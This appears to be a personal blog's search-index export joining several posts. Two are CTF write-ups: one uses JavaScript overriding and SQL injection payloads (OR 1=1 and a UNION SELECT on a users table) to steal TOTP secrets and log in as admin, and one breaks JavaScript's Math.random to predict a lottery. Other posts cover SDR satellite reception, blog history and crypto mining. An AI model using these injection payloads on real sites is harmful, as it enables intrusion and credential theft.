[{"content":"The TL;DR of this challenge was SQL injection and overriding javascript (to skip the encrypt/decrypt functions).\nChallenge Challenge description:\n My friend Bob likes sockets so much, he made his own blog to talk about them. Can you check it out and make sure that it\u0026rsquo;s secure like he assured me it is?\nLink\n Solution JS Overriding Rule #1 of web CTFs: ALWAYS check robots.txt first! This time I found:\nUser-Agent: * Disallow: /admin And in /admin there is a comment saying you need to use TOTP (Time Based OTP. Who does not use a TOTP for 2-factor authentication in 2020?)\nOkay, so back to the home page. It was using websockets to fetch blog posts. On Inspect-Elementing/View-Sourcing you find main.js which is obfuscated. I just used the default Prettifier in Chrome (the {} button in Sources tab) to deobfuscate it.\nAccording to the Network tab, the packets were encrypted:\nI was going to rewrite the encrypt and decrypt functions in Python but that would\u0026rsquo;ve wasted a lot of time. So I just decided to override JS instead.\nYou have to enable overriding support first in Google Chrome (no idea about Firefox, I don\u0026rsquo;t use it), and here is the official guide.\nThen, you need to right click on the tab (main.js in this case) and you\u0026rsquo;ll see Save for overrides. Press that, and you\u0026rsquo;re ready!\nWhile overriding, console.log() is your friend. Use it everywhere and see what\u0026rsquo;s happening. I saw a function that decrypted the received data and I added my console.log() there:\nconst e = JSON.parse(i.utils.utf8.fromBytes(i.padding.pkcs7.strip(u.decrypt(t)))); console.log(e); Cool! Now it printed everything! Now, I had to modify the sent requests. Just below the above line, there was:\nif (\u0026quot;success\u0026quot; === e) { const t = parseInt(window.location.hash.substr(1)); if (!isNaN(t)) return r.send(o.encode([\u0026quot;getPost\u0026quot;, t])); r.send(o.encode(\u0026quot;listPosts\u0026quot;)) } } And I found just what I wanted: a method to send data. In this case, it was getting the post ID from the URL, and sending that to get the post. Time for SQL Injection!\nSQL Injection To ensure I could do a SQL Injection attack, I made it:\nr.send(o.encode([\u0026quot;getPost\u0026quot;, \u0026quot;1 OR 5=5;--\u0026quot;])); And yes, it worked! I got all the posts on the site. Output of console.log:\n(3) [\u0026quot;post\u0026quot;, \u0026quot;1 OR 2=2;--\u0026quot;, Array(2)] 0: \u0026quot;post\u0026quot; 1: \u0026quot;1 OR 2=2;--\u0026quot; 2: Array(2) 0: {id: 1, title: \u0026quot;Welcome to the future!\u0026quot;, author: 1, text: \u0026quot;I finally upgraded my blog to use the tech of the …to be truly able to call my blog \u0026quot;futuristic\u0026quot;. :/\u0026quot;, postDate: 1580857200000, …} 1: {id: 2, title: \u0026quot;A review of American sockets\u0026quot;, author: 1, text: \u0026quot;They're pretty cool, in my opinion.\u0026quot;, postDate: 1580947200000, …} __proto__: Array(0) length: 3 __proto__: Array(0) Explanation: I assumed the SQL statement was something like SELECT * FROM posts WHERE id=\u0026lt;ID HERE\u0026gt;.\nSo, my input made it: SELECT * FROM posts WHERE id=1 OR 5=5;--. Select everything from table posts where ID is 1 or 5=5 (which evaluates to True), aka fetch all posts. ;-- skips whatever is at the end, and terminates the query.\nAfter that, I used UNION to join another SELECT query to get user information. In UNION, you have to make sure the number of columns match and hence the 1,1 thing:\nr.send(o.encode([\u0026quot;getPost\u0026quot;, \u0026quot;1 OR 2=2 UNION SELECT *,1,1,0 from users;--\u0026quot;])); I didn\u0026rsquo;t find users table or *,1,1,0 on first attempt. It took like 20-30 attempts to get it right.\nFirst I did UNION SELECT 1,1,1,1,1,1 but that didn\u0026rsquo;t work cause the last variable hidden was 1, and it didn\u0026rsquo;t return that. UNION SELECT 1,1,1,1,1,0 returned what was expected.\nThen I tried to get table names from information_schema.tables but that wasn\u0026rsquo;t working. I tried to use some \u0026ldquo;common\u0026rdquo; table names and users worked. Then I did UNION SELECT *,0 from users;--, and kept adding ,1 till it worked. (Remember, UNION means same number of columns)\nHere was the output:\n(3) [\u0026quot;post\u0026quot;, \u0026quot;1 OR 2=2 UNION SELECT *,1,1,0 from users;--\u0026quot;, Array(4)] 0: \u0026quot;post\u0026quot; 1: \u0026quot;1 OR 2=2 UNION SELECT *,1,1,0 from users;--\u0026quot; 2: Array(4) 0: {id: 1, title: \u0026quot;Welcome to the future!\u0026quot;, author: 1, text: \u0026quot;I finally upgraded my blog to use the tech of the …to be truly able to call my blog \u0026quot;futuristic\u0026quot;. :/\u0026quot;, postDate: 1580857200000, …} 1: {id: 1, title: \u0026quot;alice\u0026quot;, author: \u0026quot;J5YD4O2BIZYEMVJYIY3F24S3GQ2VC3ZTKJQVW5JFJUYHKODXORQQ\u0026quot;, text: 1, postDate: 1, …} 2: {id: 2, title: \u0026quot;A review of American sockets\u0026quot;, author: 1, text: \u0026quot;They're pretty cool, in my opinion.\u0026quot;, postDate: 1580947200000, …} 3: {id: 2, title: \u0026quot;bob\u0026quot;, author: \u0026quot;IE3V2RR4HRLUEOBDLVCWCQTYF5LT6RTCONNDMULGGJGS4STUMYWA\u0026quot;, text: 1, postDate: 1, …} length: 4 __proto__: Array(0) length: 3 __proto__: Array(0) I took the TOTP secret key for bob and plugged it into a TOTP Generator.\nOn the admin page, I Inspect-Elemented, and uncommented the TOTP input field and deleted password field. After entering the username (bob) and the generated TOTP, I was able to log in and get the flag.\nConclusion It greatly helps SQL injection if you can create a local SQL table on your end and try creating SQL statements that work.\nAnd, it\u0026rsquo;s sometimes far more efficient to override javascript than to manually simulate requests (using curl/python) like many beginners do.\nAsk me in the comments for any issues! And thanks jammy for the challenge!\n","description":"","id":0,"section":"posts","tags":["web-ctf","housecat-rtcp-ctf"],"title":"Overriding JS to Perform SQL Injection (Housecat RTCP CTF Writeup)","uri":"https://blog.sohamsen.me/posts/overriding-js-sql-injection/"},{"content":"TL;DR? Here.\nPS: You need to do pip install z3-solver requests for this to work.\nOkay so a little confession: Before the CTF challenge, I didn\u0026rsquo;t think much of Cryptographically Secure Pseudo Random Generators (CSPRNGS), and thought they were just for very high security purposes, like defence against a state level hacking agency. I thought normal PRNGs were enough for day-to-day purposes and no one could realistically break it.\nAfter this CTF\u0026hellip;oh boy, it takes 30 mins to break PRNGs (the one used by Javascript in Chrome/Firefox) and I\u0026rsquo;m never going to use those for security again. I should\u0026rsquo;ve never\u0026hellip;\nAnyway, let\u0026rsquo;s get started!\nChallenge Challenge description:\n I found this lotto website called JS Lotto. Wanna test your luck? I heard if you guess all 5 numbers correctly, you can win a flag!\nLink\n So, there was this challenge where you had to enter 5 numbers between 1 to 1000 and the server would match these numbers with 5 randomly generated ones. It was sending a POST request:\nPOST http://challs.houseplant.riceteacatpanda.wtf:30006/guess Content-Type: application/json Data: [1,2,3,4,5] Returns: {\u0026quot;results\u0026quot;:[858.7939810434016,511.14241319962207,251.7950653388974,371.5915221535004,262.29409707684704]} Solution After a bit of fiddling, I realized I had to break the random number generator and predict the numbers in future to win this challenge. From the name (JS Lotto) I guessed the backend was in JavaScript and Math.random() was being used (cause this won\u0026rsquo;t be a break-random() anymore if a CSPRNG was being used).\nAfter a bit of googling, I came to know XORShift128+ is used in JavaScript for generating random numbers. And it can be broken by a high-schooler. Which I am. Lucky.\nI came across XorShift128Plus predictor Python code on Github which had the code for Google Chrome and Firefox based JS engines. (Safari is there too but broken).\nSo first I got 2 random numbers from the site using CURL (1 for using as a generation seed and one for validation):\n$ curl 'http://challs.houseplant.riceteacatpanda.wtf:30006/guess' -H 'Content-Type: application/json' --data '[2,2,2,2,2]' \u0026amp; curl 'http://challs.houseplant.riceteacatpanda.wtf:30006/guess' -H 'Content-Type: application/json' --data '[2,2,2,2,2]' {\u0026quot;results\u0026quot;:[858.7939810434016,511.14241319962207,251.7950653388974,371.5915221535004,262.29409707684704]}{\u0026quot;results\u0026quot;:[862.676114246725,526.9341585672347,396.08207314621023,634.2906066568407,603.2069164482145]} The original code required the numbers to be in 0-1 range so I divided all numbers by 1000:\ndubs = [858.7939810434016,511.14241319962207,251.7950653388974,371.5915221535004,262.29409707684704] dubs = [i/1000 for i in dubs] validation_numbers = [862.676114246725,526.9341585672347,396.08207314621023,634.2906066568407,603.2069164482145] It worked with the default browser config (Chrome) but there was another issue in the code, that the first generated number (862.676114246725 in this case) was getting skipped. It was relatively easy to fix, on line 189, changed generated = [] to:\ngenerated = [to_double(browser, state0 \u0026amp; MASK)] After it\u0026rsquo;s generated, I had to remultiply the numbers by 1000 by using:\ngenerated = [i*1000 for i in generated] Now, I did some print statements to check if validation numbers were in generated, and voila! It worked.\nprint(generated) print([i in generated for i in validation_numbers]) # prints True if the number is in generated, else False. 5 True means everything is working! Now I had to just add in requests and automate it, and print the flag. It was relatively simple:\ndubs = requests.post( \u0026quot;http://challs.houseplant.riceteacatpanda.wtf:30006/guess\u0026quot;, json=[1,2,3,4,5]).json()['results'] ... # After generation is done # Had to send integers z = requests.post( \u0026quot;http://challs.houseplant.riceteacatpanda.wtf:30006/guess\u0026quot;, json=[int(i) for i in generated[:5]]).json() print(z) Conclusion Note: It may not always work since the requests have to be consecutive. A fast internet will greatly help.\nHere is the full code on GitHub Gist. Ask me in the comments for any issues!\nIt was a fun challenge and it made me realize: NEVER use non-cryptographically secure PRNGs for ANYTHING related to security.

Basically a tool which lets you hook up your PC to an external antenna, in layman’s term.\nAnd oh boy, the things you can do with it is beyond words, literally. Radio waves are not sent with words\u0026hellip; Bad joke. Sorry.\nFirst, I did what everyone does at the beginning: FM Radio. Then Air Traffic Control. Then more random gibberish. And then finally, NOAA 19 weather satellite!\n NOAA 19: An old weather satellite that has some cool cameras that enables anyone with a SDR to get low quality realtime pictures of Earth.\nhttps://en.wikipedia.org/wiki/NOAA-19\n First Attempt: Complete Failure For reasons I can’t explain myself, I decided it would be worth a try to see if I can receive the signals with the default monopole antenna (a simple straight antenna) that shipped with my SDR. As you can expect, or guess with common sense what should happen when you use an ordinary antenna to receive a weak signal from 700km away, I did not receive the slightest bit of a signal.\nResult: FAIL. The most basic component, the antenna itself was wrong.\nSecond Attempt: Mostly Failure After lots of research, I found out that there are mainly 3 types of antenna that can be used to receive the NOAA signal. Those are the Quadrifilar Helix Antenna (QFH for short, looks like two DNA strands mixed together), the Turnstile antenna (four metal rods at 90deg angles), and the easiest V-Dipole antenna (two metal rods in a V-shape, 120deg between them). If you want to read more about these, here is the link.\nNOTE: You can also use a directional antenna like a yagi, if you have the patience to point it towards the satellite for 14 minutes. Or you cam build a tracker. Directional scanners have a lot of gain. Yagi has, on average, 10-12 dB of gain which is equivalent to a 1000% to 1500% increase in reception power. Yes.\nI wanted to build a QFH antenna as it had the best reception quality, but could not source all raw materials. After a lot of thinking, I bought off the RTL-SDR V-Dipole Antenna kit which came with a tripod for ease-of-mounting.\nI happily waited for the next satellite pass, and went on the roof, excited to get my first satellite pictures.\nThe good part? I detected the satellite signal. The bad part? The satellite signal was too low for a proper conversion to image.\nResult: FAIL. The satellite was at a very low elevation (25 degree), which meant that the signals were blocked by other buildings and the satellite itself was a lot further away.\nThird Attempt: Partial Success To my surprise, the very next day had a good NOAA 19 pass at an elevation of 65 degrees. I went to the roof 30 minutes before the pass and set up my equipment. This is how it looked:\n        My laptop, my headphones, the SDR, and the dipole antenna.    …And it worked! After days, even weeks, of waiting, I got my first proper view of India through the NOAA 19 telescope. Here is the image:\n        Beautiful, innit?    Full of static in edges, but the beautiful sea looks like bliss\nResult: PARTIAL SUCCESS. I got a picture, but the quality was lower than I expected. Could be much more improved.\nFuture Attempts Here is a list of lessons I learnt:\n Don’t experiment with antennas unless you have a lot of free time, and V-Dipoles are cheap and easy, but not the best. V-Dipole antennas have a 2 dB, or roughly 63% power loss because the signal polarity does not match. For a good reception, maximum elevation must be a minimum of 50-60 degrees. Any less and you will get a very weak signal with lots of static. r/RTLSDR is a very friendly and nice subreddit that helped me find my mistakes and correct them. Kudos to them.  For my future attempts, I have some ideas that I want to test:\n A pass that has a maximum elevation above 85 degrees. My LNA (Low-Noise Amplifier. A tool to amplify the signal strength without increasing the background static/noise. Basically, magic.) which I recently bought (an LNA4ALL). Have not yet tested it for satellites, but listened to Air Traffic Control and it magically boosted the signal. 10/10 would recommend. A handheld yagi antenna for better signal reception. Basically I have to hold this antenna in my hand for 14 minutes, while moving it slowly such that it points towards the satellite. A tedious job. Or at the very least, I want to use a QFH.  In the future, I am going to expand from NOAA to Meteor to other satellites that others don’t commonly use.\nThere are about five thousand active satellites as of now. Some of those have an unencrypted downlink that allows people with SDRs and good antennas to receive their signals. Sadly, many require a directional antenna\u0026hellip; and I don\u0026rsquo;t have enough money to buy one. (Well, the shipping costs. The dish itself is cheap, but shipping is nearly 1k$. Big sad.)

No, unlike Eva 4.0, this post is not imaginary. Atleast as of April 2020. Eva 4.0 was supposed to release in June 2020 but corona :( Probably will get delayed to 2120.\nWhy is this 4.0? How many blogs existed before?! Who killed them!? Side Note: ?! or !? is called the interrobang. Small things you learn everyday.\nI killed them. Now, before I get jailed or lynched, let me prove my innocence.\nThe first blog I made was written using a custom markdown-to-static-using-python I made and \u0026hellip; well I learnt pretty quickly that reinventing the wheel is 9/10 times a bad idea. So I killed it. I migrated it\u0026rsquo;s contents to blog 2.0, though. Also, I made a theme myself (yay?) based on EBMFW. Not a PG-13 website, but a quite nice theme.\nThe second blog was written in Jekyll. Much better, even GitHub recommends that!

I still have no idea, but here\u0026rsquo;s an excerpt from that blog:\n So, you might ask, why do the same thing three times? Answer is … I don’t know. I felt it was better using WordPress instead of writing a custom CMS (as in first attempt) or waste life in writing Markdown (as in second attempt, which worked on Jekyll).\n See? I have absolutely no idea why I used Wordpress.\n        A cute kitten to bring down your anger level.

Oh, and if you try to come murder me, just take the lift (elevator for you American folks), and don\u0026rsquo;t glide in through the window. That\u0026rsquo;s \u0026hellip; quite annoying.\nI will port the (( good )) content of my previous blogs here.\nThis looks cool! What are you using? Like all cultured men, I am using Hugo with Zzo Theme. One word: Daamn, this is the best! Okay, 5 words. But honestly, it even got a gallery! And ability to do presentations! And showcases!

To atone for my sin of saying Markdown is waste of life.\nNo specific purpose. I plan on writing about my hobbies, ranging from electronics, radio transmission/receiving, astronomy/astrophotography, tech stuff, maybe even programming.

Yes, value went down. Yes, a huge income.\nCurrent thoughts: If you can have cheap electricity and cheap hardware (both of which I don\u0026rsquo;t have), go mine!\nWe all know that we cannot mine Bitcoins with a PC now, anymore, atleast until you don\u0026rsquo;t want to have something like this —\n        New product: Heater that looks like a computer!    However, BTC is not the only available crypto coin. There are thousands.\nAnd not all of them are equivalent to thousands of USD. The coin I am currently mining, as of writing, is about 0.4$ per coin (TrezarCoin, more on this below). Many are currently in a stage similar to BitCoin\u0026rsquo;s early days, that is in layman terms, still mineable on a low/middle end PC. That is mainly cause dedicated ASICs are not yet available for them.\nI\u0026rsquo;m currently experimenting with mining on my HP laptop, with a 5th gen Intel i5, and NVIDIA GeForce GT 940M (Not even a gaming GPU). And the results so far are not bad. Earnt 2 TZC (approx $0.8 at time of writing) in 18 hours.\nQ — What the hell is TZC? TreZarCoin. The crypto coin I am currently mining. 1 TZC = $0.4 for now.\n\u0026hellip;and how is mining $0.8 a day profitable? The number one reason I would say is that, it is an investment. Who knows, even TZC might skyrocket to thousands of USD in the future, just as BitCoin did. In its early days, BitCoin too amounted to a very low amount of USD.\n        How BTC was in its childhood    I cannot gurantee you will earn profit at the current rates though: It depends on the mining rig setup (efficiency of hardware), and the cost of electricity. My setup takes low power (it is a laptop after all), and electricity is quite cheap here.\nQ — Where/What/When/How do you mine?  Where — I mine with my laptop on either Linux or Windows depending on what I am using. Duh. What — I mine TrezarCoin. It was introduced in late 2017. When — I generally keep mining on my laptop 24x7, except when I am playing games or running software upgrades. And really, running a laptop 24x7 does NOT destroy it. I have been doing this (and other stuff which require always-on PC setups) for years on a HP laptop. Although I recommend plugging it in to a charger and removing the battery. How — I recommend you read one of the countless mining tutorials available on the net. I am currently using the official TrezarCoin mining pool, which has a nice \u0026ldquo;Getting Started\u0026rdquo;.  Q — How do I get started? We all have different PCs (a mid range laptop in my case). Different initial investments (0 in my case). Different power prices (IDK what\u0026rsquo;s exactly the price here). We only have a common intention: to mine.\nEnough with the weird talk. If you want to start, I suggest you head over to WhatToMine.com. Enter the GPU your computer has (you can approximate, as I did), and other stuff like cost of electricity, power consumption, etc. Then you will get a nice table of cryptocurrencies you can mine. I recommend doing a bit of homework, aka, researching on the crypto coin: How good is the market, What is the expected outcome of the price of the coin in the future, etc. Again, any questions, just ask me.\nI have some questions for you now:\n How was this post? How much will you rate this between 0 to 10 (0 - Go-die and 10 - I-will-save-this-and-ensure-this-survives-even-if-Earth-is-destroyed)? Should I add advertisements?
